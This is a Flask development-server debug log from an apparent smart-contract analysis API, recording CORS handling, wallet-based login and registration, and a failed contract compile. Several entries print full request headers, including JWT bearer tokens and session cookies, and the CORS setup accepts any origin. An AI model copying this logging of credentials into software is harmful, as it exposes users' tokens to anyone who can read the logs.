2025-07-05 17:46:08,234 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:46:08,236 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:46:08,238 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:46:08,240 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:46:08,242 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:46:08] "POST /login HTTP/1.1" 200 -
2025-07-05 17:46:14,644 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:46:14,655 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:46:14,659 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:46:14,664 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:46:14,669 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:46:14] "OPTIONS /analyze HTTP/1.1" 200 -
2025-07-05 17:46:14,698 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:46:14,711 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 17:46:14,717 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 17:46:14,731 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp97y98o3m.sol
2025-07-05 17:46:14,766 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 17:46:14,768 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 17:46:14,791 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-07-05 17:46:14,793 - app.services.contract_service - WARNING - No contracts compiled
2025-07-05 17:46:14,795 - app.services.contract_service - INFO - Temporary file /tmp/tmp97y98o3m.sol removed
2025-07-05 17:46:14,796 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-07-05 17:46:14,800 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:46:14,802 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:46:14,804 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:46:14,806 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:46:14,809 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:46:14] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-07-05 17:46:42,988 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:46:42,997 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:46:43,001 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:46:43,005 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:46:43,010 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:46:43] "OPTIONS /register HTTP/1.1" 200 -
2025-07-05 17:46:43,021 - app.api.auth - INFO - Received register request with method: POST
2025-07-05 17:46:43,024 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Connection': 'keep-alive', 'Content-Length': '129', 'Sec-Ch-Ua-Platform': '"macOS"', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"', 'Content-Type': 'application/json', 'Sec-Ch-Ua-Mobile': '?0', 'Origin': 'http://localhost:4460', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'http://localhost:4460/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-05 17:46:43,026 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:46:43,028 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:46:43,030 - app.api.auth - INFO - Attempting to register user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec4R
2025-07-05 17:46:43,445 - app.api.auth - INFO - Registration successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec4R
2025-07-05 17:46:43,448 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:46:43,450 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:46:43,452 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:46:43,454 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:46:43,456 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:46:43] "POST /register HTTP/1.1" 200 -
2025-07-05 20:27:59,577 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 20:27:59,586 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 20:27:59,595 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 20:27:59,601 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 20:27:59,610 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 20:27:59] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 20:27:59,626 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 20:27:59,629 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NDExNDZ9.kUYXDkrf7cmMp_ows65JdIe1pxiwMBkdCZwEy7z0vf8', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 20:27:59,632 - app.api.auth - INFO - Request content type: application/json
2025-07-05 20:27:59,635 - app.api.auth - INFO - Processing JSON request
2025-07-05 20:27:59,639 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 20:28:00,130 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 20:28:00,132 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 20:28:00,135 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 20:28:00,137 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 20:28:00,138 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 20:28:00,140 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 20:28:00] "POST /login HTTP/1.1" 200 -
2025-07-05 20:59:22,411 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-05 20:59:22,602 - app - INFO - Application started
2025-07-05 21:00:14,422 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-05 21:00:14,606 - app - INFO - Application started
2025-07-05 21:02:46,556 - api.auth - INFO - Received login request with method: GET
2025-07-05 21:02:46,563 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"macOS"', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-05 21:02:46,568 - api.auth - INFO - Request content type: None
2025-07-05 21:02:46,571 - api.auth - INFO - No data found in request
2025-07-05 21:02:46,577 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 21:02:46,594 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-05 21:02:47,257 - flask_cors.extension - DEBUG - Request to ''/favicon.ico'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 21:02:47,264 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-05 21:02:47,270 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 21:08:28,203 - api.auth - INFO - Received login request with method: GET
2025-07-05 21:08:28,223 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Sec-Fetch-Site': 'none', 'Cookie': '_streamlit_xsrf=2|00d954a5|639f57ed02c52bc8a72f052d070927ed|1751389603; PGADMIN_LANGUAGE=en; ajs_anonymous_id=f8e75ce0-6a2d-4175-82fa-2b8005264d98', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Mode': 'navigate', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Sec-Fetch-Dest': 'document', 'Accept-Encoding': 'gzip, deflate'}
2025-07-05 21:08:28,238 - api.auth - INFO - Request content type: None
2025-07-05 21:08:28,243 - api.auth - INFO - No data found in request
2025-07-05 21:08:28,252 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 21:08:28,262 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-05 21:14:11,611 - flask_cors.extension - DEBUG - Request to ''/favicon.ico'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 21:14:11,617 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-05 21:14:11,620 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 23:38:07,778 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-05 23:38:07,955 - app - INFO - Application started
2025-07-05 23:38:18,114 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 23:38:18,129 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 23:38:18,147 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 23:38:18,155 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 23:38:18,192 - api.auth - INFO - Received login request with method: POST
2025-07-05 23:38:18,195 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3MjUyNTl9.TF8PrWeyyQytVt56XMd2-0fLJlc1KKo2ImXzBIQXgDU', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 23:38:18,197 - api.auth - INFO - Request content type: application/json
2025-07-05 23:38:18,200 - api.auth - INFO - Processing JSON request
2025-07-05 23:38:18,204 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 23:38:18,821 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
